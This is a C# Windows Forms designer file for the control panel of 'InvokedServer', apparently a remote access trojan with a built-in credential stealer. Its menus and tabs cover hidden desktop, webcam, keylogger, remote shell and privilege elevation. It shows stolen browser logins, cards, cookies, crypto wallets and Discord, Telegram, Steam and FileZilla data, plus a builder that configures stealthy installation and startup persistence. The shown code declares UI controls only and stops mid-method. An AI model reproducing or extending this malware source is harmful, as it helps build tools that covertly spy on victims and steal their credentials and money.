using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Windows.Forms;
using ComponentFactory.Krypton.Navigator;
using ComponentFactory.Krypton.Toolkit;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using InvokedServer.Controls;
using InvokedServer.Properties;
using InvokedServer.Utilities;

namespace InvokedServer.Forms
{
    partial class FrmMain
    {
        private IContainer components;

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
                this.components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
            InvokedServer.Utilities.ListViewColumnSorter listViewColumnSorter1 = new InvokedServer.Utilities.ListViewColumnSorter();
            InvokedServer.Utilities.ListViewColumnSorter listViewColumnSorter2 = new InvokedServer.Utilities.ListViewColumnSorter();
            InvokedServer.Utilities.ListViewColumnSorter listViewColumnSorter3 = new InvokedServer.Utilities.ListViewColumnSorter();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle17 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle18 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle19 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle20 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle21 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle22 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle23 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle24 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle25 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle26 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle27 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle28 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle29 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle30 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle31 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle32 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle33 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle34 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle35 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle36 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle37 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle38 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle39 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle40 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle41 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle42 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle43 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle44 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle45 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle46 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle47 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle48 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle49 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle50 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle51 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle52 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle53 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle54 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle55 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle56 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle57 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle58 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle59 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle60 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle61 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle62 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle63 = new System.Windows.Forms.DataGridViewCellStyle();
            this.imgFlags = new System.Windows.Forms.ImageList(this.components);
            this.notifyIcon = new System.Windows.Forms.NotifyIcon(this.components);
            this.ClientContextMenuStrip = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator = new System.Windows.Forms.ToolStripSeparator();
            this.systemControlDropdown = new System.Windows.Forms.ToolStripMenuItem();
            this.systemInformationToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteShelltoolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.taskManagertoolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startupManagertoolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.registryEditortoolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.hiddenDesktopHVNCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteWebcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.offlineKeyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
            this.networkDropdown = new System.Windows.Forms.ToolStripMenuItem();
            this.connectionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
            this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.stealerDropdown = new System.Windows.Forms.ToolStripMenuItem();
            this.stealerOptionstoolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.BrowsersToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.discordTokenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cryptoDataToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.telegramInfoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.steamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.oBSKeysToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ngrokAuthKeysToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileZillaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.foxmailToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.winSCPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.miscellaneousToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pluginManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.resetSurvivalToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.actionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.shutdownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.standbyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.elevateClientPermissionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.removeOfflineClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.selectAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.imageTabs = new System.Windows.Forms.ImageList(this.components);
            this.statusStrip = new System.Windows.Forms.StatusStrip();
            this.listenToolStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.ClientsToolStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.SelectedClienttoolStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.TabsControl = new ComponentFactory.Krypton.Navigator.KryptonNavigator();
            this.ClientsPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.clientsVScrollBar = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.ClientsDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.FlagCol = new System.Windows.Forms.DataGridViewImageColumn();
            this.IPCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.TagCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.UserCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.VersionCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.StatusCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.UserStatusCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.CountryCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.OSCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.AccounttypeCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.eventsLogVScrollBar = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.EventLogDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.LogData = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.EventLogsContextMenuStrip = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.removeLogtoolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.removeAllLogstoolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.EventLogTopPanel = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.ToggleLogViewBtn = new Guna.UI2.WinForms.Guna2Button();
            this.EventLogLabel = new System.Windows.Forms.Label();
            this.clientInfoPanel = new Guna.UI2.WinForms.Guna2CustomGradientPanel();
            this.clientNetworkInfoListView = new InvokedServer.Controls.AeroListView();
            this.columnHeader8 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.clientDetailedInfoListView = new InvokedServer.Controls.AeroListView();
            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader7 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.clientInfoCountryListView = new InvokedServer.Controls.AeroListView();
            this.columnHeader10 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader11 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.clientInfoPictureBox = new Guna.UI2.WinForms.Guna2PictureBox();
            this.ServerPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.guna2GroupBox2 = new Guna.UI2.WinForms.Guna2GroupBox();
            this.WindowTitletextBox = new Guna.UI2.WinForms.Guna2TextBox();
            this.TitleLabel = new System.Windows.Forms.Label();
            this.SaveCustomTitleButton = new Guna.UI2.WinForms.Guna2GradientButton();
            this.SetTitleBtn = new Guna.UI2.WinForms.Guna2GradientButton();
            this.restoreOgTitleBtn = new Guna.UI2.WinForms.Guna2GradientButton();
            this.AnimateTitleBtn = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
            this.guna2HtmlLabel8 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.chkShowPassword = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.chkPopup = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel7 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2HtmlLabel1 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.txtNoIPPass = new Guna.UI2.WinForms.Guna2TextBox();
            this.btnListen = new Guna.UI2.WinForms.Guna2GradientButton();
            this.txtNoIPUser = new Guna.UI2.WinForms.Guna2TextBox();
            this.ncPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.txtNoIPHost = new Guna.UI2.WinForms.Guna2TextBox();
            this.chkIPv6Support = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel6 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel2 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.chkNoIPIntegration = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.chkAutoListen = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel4 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel3 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.chkShowTooltip = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.chkUseUpnp = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel5 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.BuilderPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.guna2GradientButton6 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GroupBox3 = new Guna.UI2.WinForms.Guna2GroupBox();
            this.chkChangeAsmInfo = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel13 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.txtPreviewPath = new Guna.UI2.WinForms.Guna2TextBox();
            this.label12 = new System.Windows.Forms.Label();
            this.txtRegistryKeyName = new Guna.UI2.WinForms.Guna2TextBox();
            this.label11 = new System.Windows.Forms.Label();
            this.chkStartup = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel12 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.label10 = new System.Windows.Forms.Label();
            this.chkHideSubDirectory = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel11 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.chkHide = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel10 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.txtInstallName = new Guna.UI2.WinForms.Guna2TextBox();
            this.label9 = new System.Windows.Forms.Label();
            this.txtInstallSubDirectory = new Guna.UI2.WinForms.Guna2TextBox();
            this.label8 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.picUAC1 = new System.Windows.Forms.PictureBox();
            this.rbSystem = new Guna.UI2.WinForms.Guna2RadioButton();
            this.rbProgramFiles = new Guna.UI2.WinForms.Guna2RadioButton();
            this.label6 = new System.Windows.Forms.Label();
            this.rbAppdata = new Guna.UI2.WinForms.Guna2RadioButton();
            this.chkInstall = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel9 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2GroupBox6 = new Guna.UI2.WinForms.Guna2GroupBox();
            this.chkHideLogDirectory = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel18 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.txtLogDirectoryName = new Guna.UI2.WinForms.Guna2TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.chkKeylogger = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            this.guna2HtmlLabel17 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2GroupBox5 = new Guna.UI2.WinForms.Guna2GroupBox();
            this.numericUpDownDelay = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.label7 = new System.Windows.Forms.Label();
            this.numericUpDownPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.lstHosts = new System.Windows.Forms.ListBox();
            this.BuilderContextMenuStrip = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.removeAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.btnAddHost = new Guna.UI2.WinForms.Guna2GradientButton();
            this.label3 = new System.Windows.Forms.Label();
            this.txtHost = new Guna.UI2.WinForms.Guna2TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.guna2GroupBox4 = new Guna.UI2.WinForms.Guna2GroupBox();
            this.btnMutex = new Guna.UI2.WinForms.Guna2GradientButton();
            this.txtMutex = new Guna.UI2.WinForms.Guna2TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.txtTag = new Guna.UI2.WinForms.Guna2TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.OpenBuilderBtn = new Guna.UI2.WinForms.Guna2GradientButton();
            this.kryptonPage1 = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.guna2GradientButton10 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton9 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton8 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.NotificationDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.User2Col = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.WordCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.TitleCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.NotiDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.keywordCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.GraphViewPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerLogsPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerTabControl = new ComponentFactory.Krypton.Navigator.KryptonNavigator();
            this.LoginsPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerLoginsDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn14 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn15 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.AutofillsPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerAutofillsDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.CardsPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerCardsDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn10 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn11 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn13 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn20 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn21 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn22 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn23 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.CryptoinfoPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerCryptoInfoDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn18 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn28 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn29 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn30 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.CookiesPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerCookiesDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn16 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn17 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.ValueCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn19 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.HistoryPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerHistoryDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn31 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn32 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn34 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn35 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.DownloadsPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerDownloadsDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn39 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn40 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn42 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn43 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.AppsPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.StealerAppsTabControl = new Guna.UI2.WinForms.Guna2TabControl();
            this.TokensPage = new System.Windows.Forms.TabPage();
            this.StealerTokensDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn24 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn25 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn26 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn27 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.TelegramPage = new System.Windows.Forms.TabPage();
            this.guna2DataGridView1 = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn12 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.SteamPage = new System.Windows.Forms.TabPage();
            this.StealerSteamDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn41 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn44 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn45 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn46 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.ObsPage = new System.Windows.Forms.TabPage();
            this.StealerObsDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn50 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn51 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn52 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.NgrokPage = new System.Windows.Forms.TabPage();
            this.StealerNgrokDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn57 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn58 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.FilaZillaPage = new System.Windows.Forms.TabPage();
            this.StealerFilezillaDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
